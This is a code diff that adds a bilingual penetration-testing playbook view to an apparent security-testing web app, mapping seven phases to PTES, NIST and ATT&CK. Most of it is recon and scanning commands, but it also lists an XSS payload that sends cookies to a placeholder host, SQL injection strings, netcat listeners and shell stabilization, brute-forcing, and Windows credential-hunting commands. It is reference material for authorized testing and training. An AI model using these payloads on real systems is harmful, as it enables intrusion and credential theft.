@@ -107,7 +107,190 @@ function show(view) {
   S.view = view; clearInterval(S.pollTimer); closeDrawer();
   document.querySelectorAll("nav a").forEach(x => x.classList.toggle("active", x.dataset.view === view));
   ({ dashboard: viewDashboard, targets: viewTargets, campaigns: viewCampaigns,
+     playbook: viewPlaybook,
      runs: viewRuns, monitor: viewMonitor, settings: viewSettings }[view] || viewDashboard)();
+}
+
+/* ---------- Playbook: penetration-testing methodology map ----------
+   A 7-phase attack chain (PTES spine, cross-referenced to NIST SP 800-115,
+   Cyber Kill Chain and MITRE ATT&CK). Static reference content, bilingual via zh(). */
+const PB_FW = [
+  ["1 · Pre-engagement","1 · 前期交互","Pre-engagement","Planning","—","—"],
+  ["2 · Recon (passive)","2 · 信息收集(被动)","Intelligence Gathering","Discovery","Reconnaissance","TA0043 Recon"],
+  ["3 · Enumeration (active)","3 · 枚举与扫描(主动)","Intelligence Gathering","Discovery","Weaponization · Delivery","TA0043 · TA0007"],
+  ["4 · Threat model & vuln analysis","4 · 威胁建模 & 漏洞分析","Threat Modeling · Vuln Analysis","Discovery","Exploitation (prep)","—"],
+  ["5 · Exploitation","5 · 漏洞利用","Exploitation","Attack","Exploitation · Installation","TA0001 · TA0002"],
+  ["6 · Post-exploitation","6 · 后渗透","Post-Exploitation","Attack","C2 · Actions on Objectives","TA0004·06·08·03·11"],
+  ["7 · Reporting","7 · 报告","Reporting","Reporting","—","—"],
+];
+const PB_PHASES = [
+  { n:"01", id:"pre", kind:"exec", en:"Pre-engagement", zh:"前期交互",
+    subEn:"Scope · rules · authorization", subZh:"范围、规则、授权 —— 一切的前提",
+    goalEn:"Before touching any system, lock down scope, rules of engagement and written authorization; set goals and the threat model. The gap your notes didn't cover — but authoritative process requires.",
+    goalZh:"在接触任何系统之前,敲定测试范围、交战规则与书面授权,设定目标与威胁模型。这是笔记未覆盖、但权威流程不可或缺的一环。",
+    tags:["PTES Pre-engagement","NIST Planning"],
+    tasks:[
+      {k:"1.1",en:"Scoping",zh:"范围界定",tools:["scope worksheet","asset list","IP/CIDR 清单"]},
+      {k:"1.2",en:"Rules of Engagement",zh:"交战规则",tools:["RoE 文档","测试时间窗","禁测清单"]},
+      {k:"1.3",en:"Written authorization",zh:"书面授权",tools:["授权书","合同 / SOW","应急联系人"]},
+      {k:"1.4",en:"Goals & threat model",zh:"目标与威胁建模",tools:["业务目标","数据分级","攻击者画像"]},
+    ]},
+  { n:"02", id:"osint", kind:"recon", flag:"passive", en:"Information Gathering", zh:"信息收集",
+    subEn:"Passive OSINT · no contact", subZh:"被动 OSINT · 不接触目标系统",
+    goalEn:"Collect as much public information as possible without touching the target: domains, subdomains, certificates, tech stack, exposed assets and people.",
+    goalZh:"在不直接触碰目标的前提下,尽可能多地收集公开信息:域名、子域、证书、技术栈、暴露资产与人员情报。",
+    tags:["PTES Intelligence Gathering","NIST Discovery","ATT&CK TA0043 Recon"],
+    tasks:[
+      {k:"2.1",en:"WHOIS / DNS",zh:"WHOIS / DNS 情报",tools:["whois","nslookup","dig","dnsrecon","DNSDumpster"],
+        cmds:["whois tryhackme.com","dig tryhackme.com A / MX / TXT","nslookup -type=MX tryhackme.com 1.1.1.1"]},
+      {k:"2.2",en:"Subdomain enum",zh:"子域枚举",tools:["crt.sh","Sublist3r","theHarvester","amass"],
+        cmds:["./sublist3r.py -d acmeitsupport.thm","crt.sh → 证书透明日志"]},
+      {k:"2.3",en:"Search-engine dorking",zh:"搜索引擎 / Dorking",tools:["site:","inurl:","filetype:","intitle:","Wayback","GitHub"],
+        cmds:["site:target.com filetype:pdf","inurl:admin  ·  intitle:admin"]},
+      {k:"2.4",en:"Tech fingerprint",zh:"技术栈指纹",tools:["Wappalyzer","whatweb","BuiltWith"]},
+      {k:"2.5",en:"Exposure & people",zh:"暴露资产 / 人员",tools:["Shodan","Censys","Maltego","theHarvester"]},
+    ]},
+  { n:"03", id:"enum", kind:"recon", flag:"active", en:"Enumeration & Scanning", zh:"枚举与扫描",
+    subEn:"Active probing · hosts, ports, services, content", subZh:"主动探测 · 存活主机、端口、服务、内容",
+    goalEn:"Actively interact with the target to find live hosts, open ports, running services/versions, hidden directories and virtual hosts — the attack-surface map.",
+    goalZh:"主动与目标交互,发现存活主机、开放端口、运行服务与版本、隐藏目录与虚拟主机,为漏洞分析建立攻击面地图。",
+    tags:["PTES Intelligence Gathering","NIST Discovery","ATT&CK TA0007 Discovery"],
+    tasks:[
+      {k:"3.1",en:"Host discovery",zh:"主机发现",tools:["nmap -sn","ping","traceroute","arp"],
+        cmds:["nmap -sn 10.10.0.0/24  (ARP/ICMP/TCP/UDP)","traceroute / tracert 目标"]},
+      {k:"3.2",en:"Port scanning",zh:"端口扫描",tools:["nmap -sS","-sT","-sU","-sN/-sF/-sX","-sA/-sW","masscan"],
+        cmds:["sudo nmap -sS $IP   (SYN · 默认)","sudo nmap -sU $IP   (UDP)","sudo nmap -sN/-sF/-sX $IP  (隐蔽)"]},
+      {k:"3.3",en:"Service / OS detection",zh:"服务与 OS 识别",tools:["nmap -sV","-O","-A","whatweb","httpx"],
+        cmds:["nmap -sV --version-light $IP","nmap -A $IP  (-sV -O -sC --traceroute)"]},
+      {k:"3.4",en:"Content discovery",zh:"内容发现",tools:["ffuf","gobuster","dirb","SecLists","favicon hash","sitemap.xml","curl -v"],
+        cmds:["ffuf -w SecLists/... -u http://$IP/FUZZ","curl http://$IP -v  (Server / 语言头)"]},
+      {k:"3.5",en:"Virtual-host fuzzing",zh:"虚拟主机 VHost",tools:["ffuf -H Host:"],
+        cmds:["ffuf -w namelist.txt -H \"Host: FUZZ.site.thm\" -u http://$IP -fs {size}"]},
+      {k:"3.6",en:"Web vuln scan",zh:"Web 漏洞扫描",tools:["nuclei","nikto"]},
+    ]},
+  { n:"04", id:"vuln", kind:"exec", en:"Threat Modeling & Vuln Analysis", zh:"威胁建模 · 漏洞分析",
+    subEn:"Map findings to attack paths, confirm vulns", subZh:"把发现映射成攻击路径,识别并确认漏洞",
+    goalEn:"Rank the attack surface by threat value, classify root causes, confirm exploitability with automated + manual methods, and weigh risk with vuln intelligence.",
+    goalZh:"将攻击面上的发现按威胁价值排序,分类漏洞成因,用自动化+手动手段确认其可利用性,并结合漏洞情报评估风险。",
+    tags:["PTES Threat Modeling · Vuln Analysis","NIST Discovery","OWASP WSTG / API Top 10"],
+    tasks:[
+      {k:"4.1",en:"Vulnerability classes",zh:"漏洞成因归类",tools:["OS","配置错误","弱口令/默认凭证","应用逻辑","人因"]},
+      {k:"4.2",en:"Automated scanning",zh:"自动化漏扫",tools:["Nessus","OpenVAS","nuclei"]},
+      {k:"4.3",en:"Manual proxy analysis",zh:"手动验证 / 代理",tools:["Burp Suite","Proxy","Repeater"]},
+      {k:"4.4",en:"Vuln intel & scoring",zh:"漏洞情报 & 评分",tools:["NVD","Exploit-DB","searchsploit","CVSS","VPR"],
+        cmds:["searchsploit apache 2.4","NVD / Exploit-DB → 核对 CVE 与 PoC"]},
+      {k:"4.5",en:"OWASP mapping",zh:"OWASP 对照",tools:["WSTG 12 类","API Top 10","BOLA/IDOR","BUA","功能级授权缺陷"]},
+    ]},
+  { n:"05", id:"exploit", kind:"exec", flag:"active", en:"Exploitation", zh:"漏洞利用",
+    subEn:"Gain a foothold (benign PoC first)", subZh:"利用已确认漏洞获取立足点(良性 PoC 优先)",
+    goalEn:"Launch controlled exploitation of confirmed vulns to gain initial access. Prefer benign, reversible proofs-of-concept; record the exact payload, result and evidence.",
+    goalZh:"对已确认的漏洞发起受控利用,取得初始访问 / foothold。优先使用良性、可回滚的概念验证,记录确切 payload、结果与证据。",
+    tags:["PTES Exploitation","NIST Attack","ATT&CK TA0001 Initial Access · TA0002 Execution"],
+    tasks:[
+      {k:"5.1",en:"Auth bypass",zh:"认证绕过",tools:["ffuf (枚举/爆破)","Hydra","CrackStation","逻辑缺陷"],
+        cmds:["ffuf -w names.txt -d \"username=FUZZ...\" -mr \"already exists\"","hydra -l user -P wordlist.txt $IP service"]},
+      {k:"5.2",en:"SQL injection",zh:"SQL 注入",tools:["sqlmap","Burp","UNION-based","Error-based"],
+        cmds:["0 UNION SELECT 1,2,database()","UNION SELECT ...group_concat(table_name) FROM information_schema.tables"]},
+      {k:"5.3",en:"Command injection",zh:"命令注入",tools:["whoami/ls/dir","ping/sleep/timeout","nc","OS_Command_Payload_List"]},
+      {k:"5.4",en:"XSS (Reflected/Stored/DOM/Blind)",zh:"跨站脚本 XSS",tools:["XSS Hunter","polyglot payloads"],
+        cmds:["<script>fetch('http://IP:PORT?c='+btoa(document.cookie))</script>"]},
+      {k:"5.5",en:"File inclusion LFI/RFI",zh:"文件包含 LFI/RFI",tools:["../ 路径穿越","%00","php wrappers","php reverse shell"]},
+      {k:"5.6",en:"SSRF · IDOR · Race",zh:"SSRF · IDOR · 竞争条件",tools:["Burp Repeater (并行)","参数篡改","id 遍历"]},
+      {k:"5.7",en:"Payloads & frameworks",zh:"载荷 & 利用框架",tools:["Metasploit","msfvenom","PayloadsAllTheThings","PentestMonkey"]},
+    ]},
+  { n:"06", id:"post", kind:"exec", flag:"active", en:"Post-Exploitation", zh:"后渗透",
+    subEn:"Stabilize · escalate · creds · lateral · cleanup", subZh:"稳固 shell · 提权 · 凭证 · 横向 · 清理",
+    goalEn:"Expand from the foothold: stabilize an interactive shell, escalate vertically/horizontally, harvest credentials, pivot into the network, then cover tracks. Spans several ATT&CK tactics.",
+    goalZh:"在立足点之上扩大战果:稳定交互式 shell,纵向/横向提权,搜集凭证,枢纽转发到内网,最后清理痕迹。对应 ATT&CK 多个战术。",
+    tags:["PTES Post-Exploitation","ATT&CK TA0004 PrivEsc","TA0006 Creds","TA0008 Lateral","TA0003 Persistence"],
+    tasks:[
+      {k:"6.1",en:"Shell stabilization",zh:"Shell 获取与稳定",tools:["netcat","socat","Python PTY","rlwrap","stty","Meterpreter"],
+        cmds:["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","stty raw -echo; fg  ·  export TERM=xterm","socat OPENSSL-LISTEN:53,cert=x.pem,verify=0 ..."]},
+      {k:"6.2",en:"Listeners & handlers",zh:"监听 / 处理器",tools:["nc -lvnp","socat","msf multi/handler"],
+        cmds:["nc -lvnp PORT  ·  rlwrap nc -lvnp PORT","msf → multi/handler  (staged / Meterpreter)"]},
+      {k:"6.3",en:"Linux PrivEsc",zh:"Linux 提权",tools:["LinPEAS","SUID","sudo -l","cron","capabilities"]},
+      {k:"6.4",en:"Windows PrivEsc",zh:"Windows 提权",tools:["WinPEAS","PrivescCheck","WES-NG","local_exploit_suggester"],
+        cmds:["winpeas.exe > out.txt","wes.py systeminfo.txt  (离线/低噪)"]},
+      {k:"6.5",en:"Credential hunting",zh:"Windows 凭证搜集",tools:["Unattend.xml","PowerShell history","cmdkey/runas","web.config","PuTTY reg","Scheduled Tasks","AlwaysInstallElevated","Mimikatz"],
+        cmds:["cmdkey /list → runas /savecred /user:admin cmd","reg query HKCU\\...\\PuTTY\\Sessions /f Proxy /s"]},
+      {k:"6.6",en:"Lateral · pivot · cleanup",zh:"横向移动 / 枢纽 · 清理",tools:["pivoting","端口转发","covering tracks"]},
+    ]},
+  { n:"07", id:"report", kind:"exec", en:"Reporting", zh:"报告",
+    subEn:"Deliver actionable findings & fixes", subZh:"交付可执行的发现与修复建议",
+    goalEn:"Turn the whole engagement into something the client can act on: risk-ranked findings, reproducible evidence, prioritized remediation, and a retest where needed.",
+    goalZh:"把整个过程转化为客户能行动的成果:按风险排序的发现、可复现证据、分优先级的修复建议,必要时复测验证。",
+    tags:["PTES Reporting","NIST Reporting"],
+    tasks:[
+      {k:"7.1",en:"Findings & evidence",zh:"发现归档 & 证据",tools:["PoC 截图","请求/响应留存","复现步骤"]},
+      {k:"7.2",en:"Risk rating",zh:"风险评级",tools:["CVSS","业务影响","可能性×影响"]},
+      {k:"7.3",en:"Remediation",zh:"修复建议",tools:["Prepared Statements","输入校验","WAF","及时打补丁","最小权限"]},
+      {k:"7.4",en:"Report & retest",zh:"报告撰写 & 复测",tools:["SysReptor","Dradis","Serpico","模板","Retest"]},
+    ]},
+];
+
+function pbTaskHTML(tk){
+  const title = zh() ? tk.zh : tk.en, sub = zh() ? tk.en : tk.zh;
+  const tools = (tk.tools||[]).map(x=>`<span class="pb-tool">${esc(x)}</span>`).join("");
+  const cmds = (tk.cmds||[]).map(c=>`<div class="pb-cmd">${esc(c)}</div>`).join("");
+  return `<div class="pb-task">
+    <h4><span class="pb-k">${tk.k}</span><span>${esc(title)}</span></h4>
+    <div class="pb-te">${esc(sub)}</div>
+    <div class="pb-tools">${tools}</div>
+    ${cmds ? `<div class="pb-cmds">${cmds}</div>` : ""}
+  </div>`;
+}
+function pbPhaseHTML(p){
+  const flag = p.flag==="passive" ? `<span class="pb-flag ok">${zh()?"● 被动 Passive":"● Passive"}</span>`
+             : p.flag==="active" ? `<span class="pb-flag warn">${zh()?"● 主动 Active":"● Active"}</span>` : "";
+  const tags = p.tags.map(t=>`<span class="pb-chip">${esc(t)}</span>`).join("") + flag;
+  return `<div class="pb-phase ${p.kind==="recon"?"recon":""}" id="pb-${p.id}">
+    <div class="pb-node">${p.n}</div>
+    <div class="pb-card">
+      <div class="pb-head" role="button" tabindex="0" aria-expanded="true">
+        <div class="pb-tt">
+          <div class="pb-en">${esc(zh()?p.zh:p.en)} <span class="pb-en-sub">${esc(zh()?p.en:p.zh)}</span></div>
+          <div class="pb-sub">${esc(zh()?p.subZh:p.subEn)}</div>
+          <div class="pb-goal">${esc(zh()?p.goalZh:p.goalEn)}</div>
+          <div class="pb-tags">${tags}</div>
+        </div>
+        <svg class="pb-chev" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+      </div>
+      <div class="pb-body"><div class="pb-tasks">${p.tasks.map(pbTaskHTML).join("")}</div></div>
+    </div>
+  </div>`;
+}
+function viewPlaybook(){
+  const title = zh() ? "渗透测试流程图谱" : "Penetration-Testing Playbook";
+  const lead = zh()
+    ? "一条端到端攻击链:7 阶段 · 每阶段的任务 · 每个任务的工具与命令。骨架以 PTES 为主干,对照 NIST SP 800-115 / Cyber Kill Chain / MITRE ATT&CK。"
+    : "An end-to-end attack chain: 7 phases, each phase's tasks, and the tools & commands per task. PTES spine, cross-referenced to NIST SP 800-115 / Cyber Kill Chain / MITRE ATT&CK.";
+  const authz = zh()
+    ? "仅限授权测试。任何阶段开始前须有书面授权与明确范围;每次利用优先采用良性、可回滚的 PoC。"
+    : "Authorized testing only. Every phase needs written authorization and a defined scope; prefer benign, reversible PoCs for any exploitation.";
+  const colMap = zh()?"阶段":"Phase", colK=zh()?"本图谱":"This map";
+  const fwHead = `<tr><th>${colK}</th><th>PTES</th><th>NIST 800-115</th><th>Kill Chain</th><th>MITRE ATT&amp;CK</th></tr>`;
+  const fwRows = PB_FW.map(r=>`<tr><th>${esc(zh()?r[1]:r[0])}</th><td>${esc(r[2])}</td><td>${esc(r[3])}</td><td>${esc(r[4])}</td><td class="pb-src">${esc(r[5])}</td></tr>`).join("");
+  main().innerHTML = `
+    <h1>${title}</h1><p class="lead">${lead}</p>
+    <div class="pb-authz">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2 4 6v6c0 5 3.5 8 8 10 4.5-2 8-5 8-10V6z"/><path d="M9 12l2 2 4-4"/></svg>
+      <span>${authz}</span></div>
+    <div class="pb-toolbar">
+      <span class="pb-toolbar-h">${zh()?"跨框架阶段对照":"Framework alignment"}</span>
+      <button class="btn-ghost" id="pb-toggle">${zh()?"全部折叠 / 展开":"Collapse / expand all"}</button>
+    </div>
+    <div class="panel pb-align"><div class="pb-align-scroll"><table class="pb-fw"><thead>${fwHead}</thead><tbody>${fwRows}</tbody></table></div></div>
+    <div class="pb-spine">${PB_PHASES.map(pbPhaseHTML).join("")}</div>`;
+
+  const togglePhase = ph => { const c = ph.classList.toggle("collapsed");
+    ph.querySelector(".pb-head").setAttribute("aria-expanded", String(!c)); };
+  main().querySelectorAll(".pb-head").forEach(h=>{
+    h.addEventListener("click", ()=>togglePhase(h.closest(".pb-phase")));
+    h.addEventListener("keydown", e=>{ if(e.key==="Enter"||e.key===" "){ e.preventDefault(); togglePhase(h.closest(".pb-phase")); }});
+  });
+  let allCol = false;
+  $("#pb-toggle").onclick = ()=>{ allCol=!allCol; main().querySelectorAll(".pb-phase").forEach(ph=>{
+    ph.classList.toggle("collapsed", allCol); ph.querySelector(".pb-head").setAttribute("aria-expanded", String(!allCol)); }); };
 }
 
 /* ---------- dashboard ---------- */
